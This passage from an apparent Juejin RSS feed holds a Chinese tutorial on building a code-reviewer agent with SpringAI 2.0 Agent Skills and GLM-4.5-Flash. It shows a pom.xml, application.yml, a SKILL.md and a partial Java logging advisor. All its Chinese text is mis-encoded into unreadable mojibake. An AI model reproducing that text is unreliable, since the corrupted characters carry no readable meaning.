<p>å®é™…ä½¿ç”¨æ—¶ï¼Œå¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚é€‰æ‹©åˆé€‚çš„æ£€æµ‹æ–¹æ³•ç»„åˆï¼Œå¹¶é…ç½®åˆç†çš„é˜ˆå€¼å’Œå»¶è¿Ÿæ—¶é—´ï¼Œä»¥è¾¾åˆ°æœ€ä½³çš„æ£€æµ‹æ•ˆæœã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringAI Agentå¼€å‘ç§˜ç±ï¼šè®©javaerä¹Ÿå¯ä»¥ç”¨ä¸ŠAgent Skills]]></title>    <link>https://juejin.cn/post/7599929684021837843</link>    <guid>https://juejin.cn/post/7599929684021837843</guid>    <pubDate>2026-01-28T02:32:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599929684021837843" data-draft-id="7599929684021805075" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringAI Agentå¼€å‘ç§˜ç±ï¼šè®©javaerä¹Ÿå¯ä»¥ç”¨ä¸ŠAgent Skills"/> <meta itemprop="keywords" content="åç«¯,Agent,LLM"/> <meta itemprop="datePublished" content="2026-01-28T02:32:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€ç°ç°"/> <meta itemprop="url" content="https://juejin.cn/user/377887729916126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringAI Agentå¼€å‘ç§˜ç±ï¼šè®©javaerä¹Ÿå¯ä»¥ç”¨ä¸ŠAgent Skills
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/377887729916126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ç°ç°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T02:32:18.000Z" title="Wed Jan 28 2026 02:32:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FujxVleNhjxzUgL-rjfFcVA" target="_blank" title="https://mp.weixin.qq.com/s/ujxVleNhjxzUgL-rjfFcVA" ref="nofollow noopener noreferrer">å‘Šåˆ«ä¼ ç»ŸAIå¼€å‘ï¼SpringAI Agent + Skillsé‡æ–°å®šä¹‰æ™ºèƒ½åº”ç”¨</a></p>
</blockquote>
<p>è¦è¯´æœ€è¿‘AIç›¸å…³è¯é¢˜ä¸­ä»€ä¹ˆæœ€ç«ï¼Œæ¯«æ— ç–‘é—®æ˜¯<strong>Claude Skills</strong>ï¼Œè®©æˆ‘æ„Ÿåˆ°éœ‡æƒŠçš„å€’ä¸æ˜¯å®ƒä¸ºä»€ä¹ˆç«çˆ†ï¼Œè€Œæ˜¯SpringAIå±…ç„¶å·²ç»è¿…é€Ÿæ”¯æŒä¸ŠSkillsäº†ï¼Œè¿™æ•ˆç‡çœŸçš„æ˜¯å ªæ¯”ğŸš€äº†ã€‚</p>
<p>è°è¯´AIæ—¶ä»£javaå¼€å‘è€…è¦æ‰é˜Ÿäº†ï¼Ÿ è‚‰è™½ç„¶ä¸ä¸€å®šåƒå¾—ä¸Šï¼Œä½†æ˜¯å–å£æ±¤è¿˜æ˜¯å¦¥å¦¥çš„</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡æ„å»ºä¸€ä¸ªcode reviewer, æ¥å®é™…ä½“éªŒä¸€æŠŠï¼Œå¦‚ä½•å°†SpringAIå’ŒSkillsç»“åˆèµ·æ¥ä½¿ç”¨</p>
<h2 data-id="heading-0">ä¸€ã€é¡¹ç›®åˆ›å»º</h2>
<h3 data-id="heading-1">1. åŸºç¡€ç¯å¢ƒè¦æ±‚</h3>
<p>è¦ä½“éªŒSpringAI &amp; Skillsï¼Œç›®å‰éœ€è¦å‡çº§åˆ°SpringAI 2.xç‰ˆæœ¬ï¼ŒåŒæ—¶æˆ‘ä»¬çš„SpringBootä¹Ÿå¯ä»¥å‡çº§åˆ°4.x</p>
<ul>
<li>SpringAI: 2.0.0-M2</li>
<li>JDK21</li>
<li>SpringBoot: 4.0.1</li>
</ul>
<p>é™¤äº†è¿™å‡ ä¸ªåŸºæœ¬ä¾èµ–ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€ä¸ªæ”¯æŒFunction Toolçš„å¤§æ¨¡å‹æ¥ä½œä¸ºè¿™ä¸ªå®ç°çš„å¤§è„‘ä¸­æ¢</p>
<p>æˆ‘ä»¬è¿™é‡Œé€‰æ‹©æ™ºè°±çš„å¤§æ¨¡å‹<code>GLM-4.5-Flash</code> ï¼ˆåŸå› å°±æ˜¯å› ä¸ºå®ƒå…è´¹ï¼Œä¸”æ•ˆæœè¿˜è¡Œï¼Œå¯¹æ‰€æœ‰æƒ³ä½“éªŒçš„å°ä¼™ä¼´æ²¡æœ‰ä»»ä½•é¢å¤–æˆæœ¬æŠ•å…¥ï¼‰</p>
<h3 data-id="heading-2">2. é¡¹ç›®åˆ›å»º</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªSpringAIåº”ç”¨ï¼Œå¯¹äºä¸€ä¸ªæ ‡å‡†çš„SpringAIåº”ç”¨ï¼Œåœ¨<code>pom.xml</code>é…ç½®ä¸­ï¼Œä½ ä¼šçœ‹åˆ°ä¸‹é¢è¿™äº›åŸºç¡€ç‰ˆæœ¬æŒ‡å®šï¼Œè¿™ä¸ªä¹Ÿæ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span> /&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>21<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>21<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">spring-ai.version</span>&gt;</span>2.0.0-M2<span class="hljs-tag">&lt;/<span class="hljs-name">spring-ai.version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>


<span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-bom<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring-ai.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">repositories</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">repository</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>spring-snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Spring Snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://repo.spring.io/snapshot<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">releases</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">releases</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">repository</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">repository</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Central Portal Snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>central-portal-snapshots<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://central.sonatype.com/repository/maven-snapshots/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">releases</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">releases</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">snapshots</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">enabled</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">snapshots</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">repository</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">repositories</span>&gt;</span>
</code></pre>
<p>æ¥ä¸‹æ¥é‡ç‚¹çœ‹ä¸€ä¸‹æˆ‘ä»¬è¿™ä¸ªé¡¹ç›®æ‰€ç”¨åˆ°çš„å‡ ä¸ªæ ¸å¿ƒä¾èµ–</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springaicommunity<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-agent-utils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.4.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-starter-model-zhipuai<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<ul>
<li>spring-ai-agent-utils: è¿™ä¸ªå°±æ˜¯SpringAIè¿›è¡Œagentå¼€å‘çš„å…³é”®ä¾èµ–åŒ…</li>
<li>spring-ai-starter-model-zhipuai: è¿™ä¸ªæ˜¯æ™ºè°±å¤§æ¨¡å‹è¿›è¡Œäº¤äº’çš„ä¾èµ–åŒ…</li>
</ul>
<h3 data-id="heading-3">3. é¡¹ç›®é…ç½®</h3>
<p>ä¾èµ–æå®šä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œé…ç½®LLMè®¿é—®çš„ç›¸å…³ä¿¡æ¯ã€ä»¥åŠagentç›¸å…³é…ç½®å‚æ•°ï¼Œå¯¹åº”çš„é…ç½®æ–‡ä»¶ <code>resources/application.yml</code></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">ai:</span>
    <span class="hljs-attr">zhipuai:</span>
      <span class="hljs-comment"># api-key ä½¿ç”¨ä½ è‡ªå·±ç”³è¯·çš„è¿›è¡Œæ›¿æ¢ï¼›å¦‚æœä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå¯ä»¥é€šè¿‡å¯åŠ¨å‚æ•°è¿›è¡Œè®¾ç½®</span>
      <span class="hljs-attr">api-key:</span> <span class="hljs-string">${zhipuai-api-key}</span>
      <span class="hljs-attr">chat:</span> <span class="hljs-comment"># èŠå¤©æ¨¡å‹</span>
        <span class="hljs-attr">options:</span>
          <span class="hljs-attr">model:</span> <span class="hljs-string">GLM-4.5-Flash</span>

<span class="hljs-comment">## Agent Configuration</span>
<span class="hljs-attr">agent:</span>
  <span class="hljs-attr">skills:</span>
    <span class="hljs-attr">dirs:</span> <span class="hljs-string">classpath:/.claude/skills</span>
  <span class="hljs-attr">model:</span> <span class="hljs-string">GLM-4.5-Flash</span>
</code></pre>
<p>è¿™å‡ ä¸ªé…ç½®çœ‹èµ·æ¥å’Œä¹‹å‰SpringAIç›¸å…³çš„å¹¶æ²¡æœ‰å¤ªå¤šçš„åŒºåˆ«ï¼Œå…¶ä¸­ <code>agent</code> ç›¸å…³çš„é…ç½®ä¸­ï¼Œä¸»è¦è®¾ç½®äº†skillsçš„å­˜æ”¾è·¯å¾„ï¼Œä½¿ç”¨çš„model</p>
<p>æ ¹æ®ä¸Šé¢çš„å®šä¹‰ï¼Œæˆ‘ä»¬å°†skillsä¿¡æ¯ï¼Œæ”¾åœ¨<code>resources/.claude/skills</code>ç›®å½•ä¸‹</p>
<p>æ–°å¢ä¸€ä¸ªç›®å½•<code>code-reviewer</code>ï¼Œç›®å½•ä¸‹çš„æ–‡ä»¶ä¸º <code>SKILL.md</code></p>
<pre><code class="hljs language-bash" lang="bash">.claude/skills/code-reviewer/
â””â”€â”€ SKILL.md
</code></pre>
<p>å¯¹åº”çš„å†…å®¹å¦‚ä¸‹</p>
<pre><code class="hljs language-markdown" lang="markdown">---
name: code-reviewer
<span class="hljs-section">description: Reviews Java code for best practices, security issues, and Spring Framework conventions. Use when user asks to review, analyze, or audit code.
---</span>

<span class="hljs-section"># Code Reviewer</span>

<span class="hljs-section">## Instructions</span>

åœ¨å®¡æŸ¥ä»£ç æ—¶ï¼š

<span class="hljs-bullet">1.</span> æ£€æŸ¥æ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´ï¼ˆå¦‚SQLæ³¨å…¥ã€XSSç­‰ï¼‰
<span class="hljs-bullet">2.</span> éªŒè¯æ˜¯å¦éµå¾ªäº†Spring Bootçš„æœ€ä½³å®è·µï¼ˆå¦‚æ­£ç¡®ä½¿ç”¨@Serviceã€@Repositoryç­‰æ³¨è§£ï¼‰
<span class="hljs-bullet">3.</span> æŸ¥æ‰¾æ½œåœ¨çš„ç©ºæŒ‡é’ˆå¼‚å¸¸
<span class="hljs-bullet">4.</span> æå‡ºæé«˜ä»£ç å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§çš„å»ºè®®
<span class="hljs-bullet">5.</span> æä¾›å…·ä½“çš„é€è¡Œåé¦ˆï¼Œå¹¶é™„ä¸Šä»£ç ç¤ºä¾‹
<span class="hljs-bullet">6.</span> ä»¥ä¸­æ–‡çš„æ–¹å¼è¿”å›ä»£ç è¯„å®¡ç»“æœ
</code></pre>
<h3 data-id="heading-4">4. Skillsç®€è¦è¯´æ˜</h3>
<p>æˆ‘ä»¬ä¸Šé¢çš„Skillæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªmarkdownæ–‡æ¡£ï¼ŒSpringAIæ”¯æŒçš„Skillsä¸­ï¼Œé™¤äº†åŒ…å«åŸºæœ¬çš„<code>SKILL.md</code>æ–‡ä»¶ï¼ˆåŒ…å«å…ƒæ•°æ®ï¼ˆåç§°å’Œæè¿°ï¼‰ä»¥åŠæŒ‡å¯¼ä»£ç†å¦‚ä½•æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„è¯´æ˜ï¼‰ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æœ‰ç›¸å…³çš„è„šæœ¬ã€æ¨¡æ¿å’Œå‚è€ƒèµ„æ–™</p>
<p>ä¸€ä¸ªå¸¸è§çš„skillsç»“æ„å¦‚ä¸‹</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
â”œâ”€â”€ SKILL.md          <span class="hljs-comment"># Required: instructions + metadata</span>
â”œâ”€â”€ scripts/          <span class="hljs-comment"># Optional: executable code</span>
â”œâ”€â”€ references/       <span class="hljs-comment"># Optional: documentation</span>
â””â”€â”€ assets/           <span class="hljs-comment"># Optional: templates, resources</span>
</code></pre>
<h2 data-id="heading-5">äºŒã€æ ¸å¿ƒå®ç°</h2>
<p>ç°åœ¨å‰ç½®å‡†å¤‡å·²ç»å®Œæˆï¼Œæ¥ä¸‹æ¥å¼€å§‹æ­£å¼çš„ä½“éªŒå§</p>
<h3 data-id="heading-6">2.1 äº¤äº’æ—¥å¿—æ‰“å° MyLoggingAdvisor</h3>
<p>ä¸ºäº†è®©ç³»ç»Ÿä¸å¤§æ¨¡å‹ä¹‹é—´çš„äº¤äº’æ›´æ¸…æ™°ï¼Œæˆ‘ä»¬å°†åŒæ–¹äº¤äº’çš„æ—¥å¿—è¿›è¡Œæ›´å‹å¥½çš„æ‰“å°ï¼ˆä¹Ÿé¡ºä¾¿çœ‹ä¸€ä¸‹ï¼Œä¸€æ¬¡ç”¨æˆ·æ„ŸçŸ¥çš„é—®ç­”è¿‡ç¨‹ä¸­ï¼Œå®é™…ä¸Šæœ‰å‡ æ¬¡äº¤äº’ï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLoggingAdvisor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseAdvisor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> order;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> showSystemMessage;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> showAvailableTools;

    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">cnt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">1</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-title function_">MyLoggingAdvisor</span><span class="hljs-params">(<span class="hljs-type">int</span> order, <span class="hljs-type">boolean</span> showSystemMessage, <span class="hljs-type">boolean</span> showAvailableTools)</span> {
        <span class="hljs-built_in">this</span>.order = order;
        <span class="hljs-built_in">this</span>.showSystemMessage = showSystemMessage;
        <span class="hljs-built_in">this</span>.showAvailableTools = showAvailableTools;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.order;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ChatClientRequest <span class="hljs-title function_">before</span><span class="hljs-params">(ChatClientRequest chatClientRequest, AdvisorChain advisorChain)</span> {
        System.out.println(<span class="hljs-string">"======================= ç¬¬ "</span> + cnt.getAndAdd(<span class="hljs-number">1</span>) + <span class="hljs-string">" è½® ===================================="</span>);

        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"\nUSER: "</span>);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.showSystemMessage &amp;&amp; chatClientRequest.prompt().getSystemMessage() != <span class="hljs-literal">null</span>) {
            sb.append(<span class="hljs-string">"\n - SYSTEM: "</span>).append(first(chatClientRequest.prompt().getSystemMessage().getText(), <span class="hljs-number">300</span>));
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.showAvailableTools) {
            <span class="hljs-type">Object</span> <span class="hljs-variable">tools</span> <span class="hljs-operator">=</span> <span class="hljs-string">"No Tools"</span>;

            <span class="hljs-keyword">if</span> (chatClientRequest.prompt().getOptions() <span class="hljs-keyword">instanceof</span> ToolCallingChatOptions toolOptions) {
                tools = toolOptions.getToolCallbacks().stream().map(tc -&gt; tc.getToolDefinition().name()).toList();
            }

            sb.append(<span class="hljs-string">"\n - TOOLS: "</span>).append(ModelOptionsUtils.toJsonString(tools));
        }

        <span class="hljs-type">Message</span> <span class="hljs-variable">lastMessage</span> <span class="hljs-operator">=</span> chatClientRequest.prompt().getLastUserOrToolResponseMessage();

        <span class="hljs-keyword">if</span> (lastMessage.getMessageType() == MessageType.TOOL) {
